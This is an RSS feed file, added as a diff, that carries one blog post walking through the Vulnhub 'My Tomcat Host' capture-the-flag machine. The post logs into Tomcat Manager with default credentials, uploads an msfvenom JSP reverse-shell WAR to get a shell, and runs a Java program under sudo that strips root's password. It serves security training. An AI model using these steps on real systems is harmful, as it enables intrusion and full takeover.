@@ -1,0 +1,230 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>My Tomcat Host Archives - Armour Infosec</title>
+	<atom:link href="https://www.armourinfosec.com/tag/my-tomcat-host/feed/" rel="self" type="application/rss+xml" />
+	<link>https://www.armourinfosec.com/tag/my-tomcat-host/</link>
+	<description>Do Your Part - Be Security Smart</description>
+	<lastBuildDate>Thu, 09 Apr 2020 13:04:07 +0000</lastBuildDate>
+	<language>en-US</language>
+	<sy:updatePeriod>
+	hourly	</sy:updatePeriod>
+	<sy:updateFrequency>
+	1	</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=6.3.1</generator>
+
+<image>
+	<url>https://www.armourinfosec.com/wp-content/uploads/2018/02/ai.png</url>
+	<title>My Tomcat Host Archives - Armour Infosec</title>
+	<link>https://www.armourinfosec.com/tag/my-tomcat-host/</link>
+	<width>32</width>
+	<height>32</height>
+</image> 
+	<item>
+		<title>My Tomcat Host Vulnhub Walkthrough</title>
+		<link>https://www.armourinfosec.com/my-tomcat-host-walkthrough/</link>
+					<comments>https://www.armourinfosec.com/my-tomcat-host-walkthrough/#respond</comments>
+		
+		<dc:creator><![CDATA[Armour Infosec]]></dc:creator>
+		<pubDate>Thu, 09 Apr 2020 08:13:21 +0000</pubDate>
+				<category><![CDATA[Walkthrough]]></category>
+		<category><![CDATA[My Tomcat Host]]></category>
+		<category><![CDATA[vulnhub]]></category>
+		<category><![CDATA[walkthrough]]></category>
+		<guid isPermaLink="false">https://www.armourinfosec.com/?p=25994</guid>
+
+					<description><![CDATA[<p>Hello everyone. This time I am sharing the walkthrough of a CTF machine designed by Akanksha Verma. This is a...</p>
+<p>The post <a rel="nofollow" href="https://www.armourinfosec.com/my-tomcat-host-walkthrough/">My Tomcat Host Vulnhub Walkthrough</a> appeared first on <a rel="nofollow" href="https://www.armourinfosec.com/">Armour Infosec</a>.</p>
+]]></description>
+										<content:encoded><![CDATA[<p>Hello everyone. This time I am sharing the walkthrough of a CTF machine designed by <a href="https://twitter.com/akankshavermasv">Akanksha Verma</a>. This is a quick walkthrough of a vulnhub machine, My tomcat host. You can find this box on <a href="https://www.infosecwarrior.com/my-tomcat-host/">Infosec Warrior</a>. According to there author it is a medium or intermediate level machine with good privilege escalation. So here we go.</p>
+<h3 id="3194" class="ge gf aw ay gg b gh gi gj gk gl gm gn go gp gq gr dy"><strong class="gg hu"><img decoding="async" fetchpriority="high" class="alignnone wp-image-25997 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-09-13-02-04-e1586436625155.png" alt="My Tomcat Host: 1 walkthrough" width="800" height="314" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-09-13-02-04-e1586436625155.png 800w, https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-09-13-02-04-e1586436625155-300x118.png 300w, https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-09-13-02-04-e1586436625155-768x301.png 768w" sizes="(max-width: 800px) 100vw, 800px" /></strong></h3>
+<h3 class="ge gf aw ay gg b gh gi gj gk gl gm gn go gp gq gr dy"><strong class="gg hu">Methodology applied :</strong></h3>
+<h5 id="5ea8" class="ge gf aw hy gg b gh gi gj gk gl gm gn go gp gq gr dy">Network Scanning</h5>
+<ul class="">
+<li id="2f58" class="ge gf aw ay gg b gh gi gj gk gl gm gn go gp gq gr hz ia ib" data-selectable-paragraph="">netdiscover</li>
+<li data-selectable-paragraph="">Nmap</li>
+</ul>
+<h5 id="de79" class="ge gf aw hy gg b gh gi gj gk gl gm gn go gp gq gr dy">Enumeration</h5>
+<ul class="">
+<li id="8560" class="ge gf aw ay gg b gh gi gj gk gl gm gn go gp gq gr hz ia ib" data-selectable-paragraph="">Nmap</li>
+<li id="9e71" class="ge gf aw ay gg b gh ic gj id gl ie gn if gp ig gr hz ia ib" data-selectable-paragraph="">nikto</li>
+<li id="c233" class="ge gf aw ay gg b gh gi gj gk gl gm gn go gp gq gr hz ia ib" data-selectable-paragraph="">msfvenom</li>
+</ul>
+<h5 id="634c" class="ge gf aw hy gg b gh gi gj gk gl gm gn go gp gq gr dy">Privilege escalation</h5>
+<ul class="">
+<li id="b7e7" class="ge gf aw ay gg b gh gi gj gk gl gm gn go gp gq gr hz ia ib" data-selectable-paragraph="">JAVA</li>
+<li data-selectable-paragraph="">sudo -l</li>
+</ul>
+<h3>Network Scanning</h3>
+<p>For scanning the network and obtaining the IP address of the box I used <strong>netdiscover. </strong> As shown below</p>
+<pre class="toolbar:2 striped:false nums:false nums-toggle:false show-plain:3 lang:default highlight:0 decode:true">#netdiscover -i vboxnet0
+	Currently scanning: 192.168.18.0/16   |   Screen View: Unique Hosts                                                                                      
+	2 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 102               
+	_____________________________________________________________________________
+	  IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+	-----------------------------------------------------------------------------
+	192.168.2.2     08:00:27:a8:2f:81      1      42  PCS Systemtechnik GmbH      
+	192.168.2.15    08:00:27:f7:24:84      1      60  PCS Systemtechnik GmbH</pre>
+<p>So the IP of the box is <strong>192.168.2.15. </strong> let&#8217;s start with <strong>Nmap scanning</strong></p>
+<p>&nbsp;</p>
+<pre class="toolbar:2 striped:false nums:false nums-toggle:false show-plain:3 lang:default highlight:0 decode:true">#nmap -p- -A -O  192.168.2.15
+	Starting Nmap 7.80 ( https://nmap.org/ ) at 2020-04-09 09:52 IST
+	Nmap scan report for 192.168.2.15
+	Host is up (0.00044s latency).
+	Not shown: 65533 filtered ports
+	PORT     STATE SERVICE VERSION
+	22/tcp   open  ssh     OpenSSH 6.6.1 (protocol 2.0)
+	| ssh-hostkey: 
+	|   2048 61:16:10:91:bd:d7:6c:06:df:a2:b9:b5:b9:3b:dd:b6 (RSA)
+	|   256 0e:a4:c9:fc:de:53:f6:1d:de:a9:de:e4:21:34:7d:1a (ECDSA)
+	|_  256 ec:27:1e:42:65:1c:4a:3b:93:1c:a1:75:be:00:22:0d (ED25519)
+	8080/tcp open  http    Apache Tomcat 9.0.31
+	|_http-favicon: Apache Tomcat
+	|_http-title: Apache Tomcat/9.0.31
+	MAC Address: 08:00:27:F7:24:84 (Oracle VirtualBox virtual NIC)
+	Device type: general purpose
+	Running: Linux 3.X|4.X
+	OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+	OS details: Linux 3.10 - 4.11, Linux 3.2 - 4.9
+	Network Distance: 1 hop
+	TRACEROUTE
+	HOP RTT     ADDRESS
+	1   0.44 ms 192.168.2.15
+</pre>
+<h3>Enumeration :</h3>
+<p>We can see that there is an open port number <strong>8080. </strong>So let us have a look there</p>
+<p id="618e" class="ge gf aw hy gg b gh gi gj gk gl gm gn go gp gq gr dy" data-selectable-paragraph=""><img decoding="async" class="alignnone wp-image-25996 size-large" src="https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-09-09-53-20-1024x446.png" alt="" width="1024" height="446" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-09-09-53-20-1024x446.png 1024w, https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-09-09-53-20-300x131.png 300w, https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-09-09-53-20-768x335.png 768w, https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-09-09-53-20.png 1065w" sizes="(max-width: 1024px) 100vw, 1024px" /></p>
+<p>&nbsp;</p>
+<p>Good there a <strong>Tomcat Host </strong>on the box. For more information, I fired <strong>nikto</strong>.</p>
+<pre class="toolbar:2 striped:false nums:false nums-toggle:false show-plain:3 lang:default highlight:0 decode:true">#nikto -h http://192.168.2.15:8080/
+	
+	- Nikto v2.1.6
+	---------------------------------------------------------------------------
+	+ Target IP:          192.168.2.15
+	+ Target Hostname:    192.168.2.15
+	+ Target Port:        8080
+	+ Start Time:         2020-04-09 09:54:21 (GMT5.5)
+	---------------------------------------------------------------------------
+	+ Server: No banner retrieved
+	+ The anti-clickjacking X-Frame-Options header is not present.
+	+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+	+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+	+ No CGI Directories found (use '-C all' to force check all possible dirs)
+	+ OSVDB-39272: /favicon.ico file identifies this app/server as: Apache Tomcat (possibly 5.5.26 through 8.0.15), Alfresco Community
+	+ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS 
+	+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+	+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+	+ /examples/servlets/index.html: Apache Tomcat default JSP pages present.
+	+ OSVDB-3720: /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users.
+	+ /axis2/axis2-web/HappyAxis.jsp: Apache Axis2 Happiness Page identified which includes internal application details.
+	+ Default account found for 'Tomcat Manager Application' at /manager/html (ID 'tomcat', PW 'tomcat'). Apache Tomcat.
+	+ /host-manager/html: Default Tomcat Manager / Host Manager interface found
+	+ /manager/html: Tomcat Manager / Host Manager interface found (pass protected)
+	+ /axis2/services/Version/getVersion: Apache Axis2 version identified.
+	+ /axis2/services/listServices: Apache Axis2 WebServices identified.
+	+ /axis2/axis2-web/index.jsp: Apache Axis2 Web Application identified.
+	+ /host-manager/status: Default Tomcat Server Status interface found
+	+ /manager/status: Tomcat Server Status interface found (pass protected)
+	+ 8041 requests: 0 error(s) and 18 item(s) reported on remote host
+	+ End Time:           2020-04-09 09:55:13 (GMT5.5) (52 seconds)
+	---------------------------------------------------------------------------
+	+ 1 host(s) tested</pre>
+<p>Out of all the things, the most important to us is that we have credentials for tomcat manager application, <strong class="gg hu">tomcat: tomcat. </strong>and the directory <strong class="gg hu">/manager/html </strong> page .</p>
+<p><img decoding="async" class="alignnone wp-image-25998 size-large" src="https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-09-09-57-03-1024x432.png" alt="" width="1024" height="432" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-09-09-57-03-1024x432.png 1024w, https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-09-09-57-03-300x126.png 300w, https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-09-09-57-03-768x324.png 768w, https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-09-09-57-03.png 1196w" sizes="(max-width: 1024px) 100vw, 1024px" /></p>
+<p>We were in the host and found there is a <strong>.war file upload </strong>option. So without wasting time I use msfvenom to generate a shell.war file</p>
+<pre class="toolbar:2 striped:false nums:false nums-toggle:false show-plain:3 lang:default highlight:0 decode:true">#msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.2.1 LPORT=1505 -f war &gt; armour.war
+	
+	Payload size: 1106 bytes
+	The final size of war file: 1106 bytes</pre>
+<p>Where LHOST = listener host IP  &amp;&amp; LPORT = listener port</p>
+<p><img decoding="async" class="alignnone wp-image-25999 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-09-09-57-44.png" alt="" width="923" height="107" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-09-09-57-44.png 923w, https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-09-09-57-44-300x35.png 300w, https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-09-09-57-44-768x89.png 768w" sizes="(max-width: 923px) 100vw, 923px" /></p>
+<p>And we have our payload ready, and we are all set to launch the attack. Upload this shell.war file and call it on the browser while having the listener on, on our machine</p>
+<pre class="toolbar:2 striped:false nums:false nums-toggle:false show-plain:3 lang:default highlight:0 decode:true">#nc -nlvp 1505
+	
+	listening on [any] 1505 ...
+ 	connect to [192.168.2.1] from (UNKNOWN) [192.168.2.15] 57094
+	id
+	uid=998(tomcat) gid=997(tomcat) groups=997(tomcat)
+	hostname
+	my_tomcat
+	whoami
+	tomcat</pre>
+<p>Got the shell of the user tomcat</p>
+<h3>Privilege Escalation:</h3>
+<p>Firstly I converted the shell into the interactive shell and I checked them for permissions on sudo command :</p>
+<pre class="toolbar:2 toolbar-hide:false striped:false nums:false nums-toggle:false show-plain:3 lang:default highlight:0 decode:true">sh-4.2$ id
+	uid=998(tomcat) gid=997(tomcat) groups=997(tomcat)
+	sh-4.2$ sudo -l
+	Matching Defaults entries for tomcat on this host:
+	    requiretty, !visiblepw, always_set_home, env_reset, env_keep="COLORS
+	    DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS", env_keep+="MAIL PS1
+	    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE
+	    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY
+	    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL
+	    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
+	    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
+
+	User tomcat may run the following commands on this host:
+	    (ALL) NOPASSWD:
+	    /usr/lib/jvm/java-1.8.0-openjdk-1.8.0.242.b08-0.el7_7.x86_64/jre/bin/java</pre>
+<p>I see that we can run <strong>java</strong> command with <strong>sudo</strong> privileges. You can find the program from any place, I got it on stack overflow.</p>
+<pre class="toolbar:2 striped:false nums:false nums-toggle:false show-plain:3 lang:default highlight:0 decode:true">import java.io.BufferedReader;
+	import java.io.InputStreamReader;
+
+	public class armour {  //you have to change thew class same as file name
+	    public static void main(String args[]) {
+	        String s;
+	        Process p;
+	        try {
+	            p = Runtime.getRuntime().exec("passwd -d root");  //the command you want to execute
+	            BufferedReader br = new BufferedReader(
+	                new InputStreamReader(p.getInputStream()));
+	            while ((s = br.readLine()) != null)
+	                System.out.println("line: " + s);
+	            p.waitFor();
+	            System.out.println ("exit: " + p.exitValue());
+	            p.destroy();
+	        } catch (Exception e) {}
+	    }
+	}</pre>
+<p>now I compile the code and executed it.</p>
+<pre class="toolbar:2 striped:false nums:false nums-toggle:false show-plain:3 lang:default highlight:0 decode:true">bash-4.2$ javac armour.java
+	bash-4.2$ sudo java armour
+	line: Removing password for user root.
+	line: passwd: Success
+	exit: 0
+	bash-4.2$ su root
+	[root@my_tomcat tmp]# id 
+	uid=0(root) gid=0(root) groups=0(root)
+	[root@my_tomcat tmp]# hostname 
+	my_tomcat
+	[root@my_tomcat tmp]# whoami 
+	root
+	[root@my_tomcat tmp]# uname -a
+	Linux my_tomcat 3.10.0-1062.18.1.el7.x86_64 #1 SMP Tue Mar 17 23:49:17 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+	[root@my_tomcat tmp]# cd /root/
+	[root@my_tomcat ~]# ls
+	proof.txt
+	[root@my_tomcat ~]# cat proof.txt 
+	Best of Luck
+	628435356e49f976bab2c04948d22fe4
+	[root@my_tomcat ~]#</pre>
+<p>Boom !!! Eureka !!! I Got root &#8230;&#8230; and here is the flag.</p>
+<p>&nbsp;</p>
+<p>The post <a rel="nofollow" href="https://www.armourinfosec.com/my-tomcat-host-walkthrough/">My Tomcat Host Vulnhub Walkthrough</a> appeared first on <a rel="nofollow" href="https://www.armourinfosec.com/">Armour Infosec</a>.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://www.armourinfosec.com/my-tomcat-host-walkthrough/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+	</channel>
+</rss>
